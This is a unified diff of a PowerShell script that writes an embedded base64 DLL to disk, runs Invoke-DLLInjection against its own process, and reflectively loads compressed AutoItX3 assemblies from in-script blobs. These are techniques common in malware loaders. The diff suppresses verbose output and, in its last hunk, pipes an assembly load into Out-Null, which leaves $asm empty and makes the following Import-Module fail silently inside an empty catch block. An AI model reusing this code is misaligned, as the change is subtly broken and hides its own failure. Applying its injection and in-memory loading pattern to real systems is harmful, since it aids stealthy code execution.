@@ -397,7 +397,7 @@ else
     [system.io.file]::WriteAllBytes($DLLPath, [System.Convert]::FromBase64String($x64DLL))
 }
 
-Invoke-DLLInjection -ProcessID $pid -Verbose -DLL $DLLPath
+Invoke-DLLInjection -ProcessID $pid -DLL $DLLPath
 
 # AutoItX3.Assembly.dll
 $EncodedCompressedFile = @'
@@ -406,7 +406,7 @@ $EncodedCompressedFile = @'
 $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
 $UncompressedFileBytes = New-Object Byte[](41272)
 $DeflatedStream.Read($UncompressedFileBytes, 0, 41272) | Out-Null
-[Reflection.Assembly]::Load($UncompressedFileBytes)
+[Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null
 
 # AutoItX3.PowerShell.dll
 $EncodedCompressedFile = @'
@@ -415,7 +415,7 @@ $EncodedCompressedFile = @'
 $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
 $UncompressedFileBytes = New-Object Byte[](49976)
 $DeflatedStream.Read($UncompressedFileBytes, 0, 49976) | Out-Null
-$asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
+$asm = [Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null
 try{
     Import-Module -Assembly $asm
 }catch {}
